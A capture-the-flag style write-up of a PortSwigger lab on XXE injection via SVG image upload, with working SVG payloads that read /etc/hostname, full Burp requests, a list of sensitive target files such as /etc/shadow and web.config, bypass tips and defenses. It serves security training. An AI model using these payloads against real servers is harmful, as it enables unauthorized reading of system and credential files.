# PortSwigger Lab: Exploiting XXE via Image File Upload

## Overview

XXE (XML External Entity Injection) is a vulnerability that occurs when XML parsers process external entities defined in the DOCTYPE declaration. This lab demonstrates XXE exploitation through SVG image upload, where the Apache Batik library processes the SVG file and resolves external entities.

## Lab Details

| Attribute | Value |
|-----------|-------|
| **Lab** | Exploiting XXE via image file upload |
| **Difficulty** | Practitioner |
| **Category** | XXE (XML External Entity) |
| **Library** | Apache Batik |
| **Date** | July 19, 2026 |
| **Hostname Found** | `730e06daaa2d` |

---

## Lab Objective

Upload an image that displays the contents of the `/etc/hostname` file after processing, then submit the value of the server hostname.

---

## Screenshots

### Creating the SVG Payload

![Creating SVG Payload](images/01-creating-svg-payload.png)
*Figure 1: Creating the malicious SVG file with XXE payload using nano editor*

### Burp Suite - Intercepting Upload Request

![Burp Suite Intercept](images/02-burp-intercept.png)
*Figure 2: Burp Suite intercepting the POST request to /post/comment*

### Modified Request in Burp Repeater

![Burp Repeater Request](images/03-burp-repeater.png)
*Figure 3: Modified request with avatar.svg and XML payload in Burp Repeater*

### Successful Comment Submission

![Comment Submission Success](images/04-comment-success.png)
*Figure 4: "Thank you for your comment!" response confirming successful upload*

### Extracted Hostname in Avatar

![Hostname in Avatar](images/05-hostname-in-avatar.png)
*Figure 5: Hostname `730e06daaa2d` displayed in the avatar image (visible after zooming in)*

### Lab Solved

![Lab Solved](images/06-lab-solved.png)
*Figure 6: Lab completion notification after submitting the hostname*

---

## Attack Methodology

### Reconnaissance Phase

| Step | Action | Details |
|------|--------|---------|
| 1 | Identify Upload Feature | Blog comment section allows avatar uploads |
| 2 | Determine File Types Accepted | SVG files accepted for avatar images |
| 3 | Identify XML Processing | Apache Batik library processes SVG files |

### Exploitation Phase

| Step | Action | Payload/Command |
|------|--------|-----------------|
| 1 | Create SVG Payload | `<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>` |
| 2 | Upload Malicious File | Select `avatar.svg` as avatar |
| 3 | Intercept with Burp | Capture POST request to `/post/comment` |
| 4 | Modify Request | Change filename to `avatar.svg`, Content-Type to `image/svg+xml` |
| 5 | View Result | Check avatar image for hostname |
| 6 | Submit Solution | Enter hostname in "Submit solution" button |

---

## Core Concepts

### SVG as XML Vector

| Concept | Description |
|---------|-------------|
| **SVG Structure** | SVG (Scalable Vector Graphics) is an XML-based vector image format |
| **Parser** | Apache Batik is a Java-based SVG toolkit that processes SVG files |
| **Vulnerability** | Batik resolves external entities by default, enabling XXE attacks |

### XML Entity Types

| Type | Syntax | Description |
|------|--------|-------------|
| Internal Entity | `<!ENTITY name "value">` | Defined and used within the same XML document |
| External Entity | `<!ENTITY name SYSTEM "URI">` | Reference external resources using URIs |
| DOCTYPE Declaration | `<!DOCTYPE root [<!ENTITY name SYSTEM "file:///path">]>` | Defines document type and entity declarations |

---

## Attack Payloads

### Basic Payload

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg">
  <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
### Enhanced Payload (Better Visibility)
```<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<svg width="200px" height="200px" xmlns="http://www.w3.org/2000/svg">
  <rect width="200" height="200" fill="white"/>
  <text font-size="24" x="10" y="50" fill="red" font-weight="bold">&xxe;</text>
</svg>
```
## Burp Suite Request Analysis

### Original Request (PNG Upload)

```http
POST /post/comment HTTP/2
Host: 0a6300cb035e668c80892199001f005a.web-security-academy.net
Cookie: session=QMRvADT706bnnS56HrZyo4pEpuVQlEcR
Content-Type: multipart/form-data; boundary=----Boundary

------Boundary
Content-Disposition: form-data; name="csrf"

LhNwjUCoMFEqiXOAC1PL3GZ8vBARPPzZ
------Boundary
Content-Disposition: form-data; name="postId"

1
------Boundary
Content-Disposition: form-data; name="comment"

good
------Boundary
Content-Disposition: form-data; name="name"

bob miller
------Boundary
Content-Disposition: form-data; name="avatar"; filename="avatar.png"
Content-Type: image/png

[PNG binary data]
------Boundary--

### Modified Request (SVG XXE Payload)

POST /post/comment HTTP/2
Host: 0a6300cb035e668c80892199001f005a.web-security-academy.net
Cookie: session=QMRvADT706bnnS56HrZyo4pEpuVQlEcR
Content-Type: multipart/form-data; boundary=----Boundary

------Boundary
Content-Disposition: form-data; name="csrf"

LhNwjUCoMFEqiXOAC1PL3GZ8vBARPPzZ
------Boundary
Content-Disposition: form-data; name="postId"

1
------Boundary
Content-Disposition: form-data; name="comment"

good
------Boundary
Content-Disposition: form-data; name="name"

bob miller
------Boundary
Content-Disposition: form-data; name="avatar"; filename="avatar.svg"
Content-Type: image/svg+xml

<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<svg width="200px" height="200px" xmlns="http://www.w3.org/2000/svg">
  <rect width="200" height="200" fill="white"/>
  <text font-size="24" x="10" y="50" fill="red" font-weight="bold">&xxe;</text>
</svg>
------Boundary--

## Key Modifications

| Field | Original | Modified |
| :--- | :--- | :--- |
| **filename** | `avatar.png` | `avatar.svg` |
| **Content-Type** | `image/png` | `image/svg+xml` |
| **File Content** | PNG binary | SVG XML payload |

## File Disclosure Targets

| OS | Target Files |
| :--- | :--- |
| **Linux** | `/etc/hostname`, `/etc/passwd`, `/etc/shadow`, `/etc/hosts`, `/proc/self/environ`, `/var/www/html/config.php` |
| **Windows** | `C:\windows\win.ini`, `C:\windows\system32\drivers\etc\hosts`, `C:\inetpub\wwwroot\web.config` |

---

## Results

### Extracted Data
* **File:** `/etc/hostname`
* **Content:** `730e06daaa2d`

### Comment Display
```text
bob miller | 19 July 2026
good
[Avatar displaying: 730e06daaa2d]
```

### Lab Completion

| Attribute | Value |
| :--- | :--- |
| **Hostname submitted** | `730e06daaa2d` |
| **Status** | ✅ Solved |

---

## Common Issues and Solutions

### Issue 1: Internal Server Error
* **Error Message:**
```text
Internal Server Error
SVG transcoder exited with an error: null
Enclosed Exception: The processing instruction target matching "[xX][mM][lL]" is not allowed.
```
* **Solutions:**
  * Try removing the `<?xml version="1.0" standalone="yes"?>` declaration
  * Use a different payload syntax
  * Use the `xlink:href` approach

### Issue 2: Hostname Not Visible
* **Problem:** The text is too small or positioned outside the viewable area.
* **Solutions:**
  * Increase font size to `24px` or higher
  * Add a white background rectangle
  * Position text at `x=10, y=50`
  * Use red or bold text for visibility
  * Right-click image → Open in new tab
  * Zoom in on the avatar

### Issue 3: Incorrect File Type
* **Problem:** The server doesn't process the SVG properly.
* **Solutions:**
  * Ensure `filename="avatar.svg"`
  * Set `Content-Type: image/svg+xml`
  * Verify the SVG XML is properly formatted

---

## Defenses and Bypasses

### Common Defenses
* **Disable External Entities:** Configure XML parser to not resolve external entities
* **Input Validation:** Validate file types, content, and extensions
* **Sanitize SVGs:** Use libraries like SVG Sanitizer
* **Whitelist:** Only allow specific image formats (PNG, JPG, GIF)

### Bypass Techniques
* **Different Protocols:** Use `file://`, `http://`, `ftp://`, `php://` wrappers
* **Parameter Entities:** Use `%` entities for internal DTD references
* **Encoding:** Use `CDATA` sections, HTML encoding, base64
* **Alternative Parsers:** Exploit different XML parser behaviors

---

## Tools and Resources
* **Burp Suite Repeater:** Test payloads and modify requests
* **Burp Suite Proxy:** Intercept and view HTTP traffic
* **Nano/VSCode:** Create SVG payload files
* **Browser DevTools:** Inspect and view avatar images
* **PayloadsAllTheThings:** XXE payload wordlist
* **HackTricks:** XML injection references

---

## Methodology Mindset

| Phase | Action Items |
| :--- | :--- |
| **1. Identify Entry Points** | Check file upload forms, comment sections, avatar uploads |
| **2. Analyze File Processing** | Determine which libraries process uploaded files |
| **3. Test SVG Upload** | Try uploading SVG files to see if accepted |
| **4. Create Payload** | Craft XXE payload to read system files |
| **5. Intercept Request** | Use Burp to modify filename and Content-Type |
| **6. View Output** | Check rendered image for extracted data |
| **7. Submit Solution** | Submit extracted data to complete lab |


## Key Takeaways
* **SVG = XML:** SVG files are processed as XML, making them vulnerable to XXE
* **Apache Batik Vulnerability:** The library resolves external entities by default
* **File Extension Matters:** Ensure `.svg` extension and proper `Content-Type`
* **Check the Corners:** Extracted data may appear tiny - zoom in!
* **Multiple Payloads:** Try different syntax if the first one fails

---

## References
* PortSwigger - Exploiting XXE via image file upload
* OWASP XXE Prevention Cheat Sheet
* Apache Batik Security
* HackTricks - XXE
* PayloadsAllTheThings - XXE
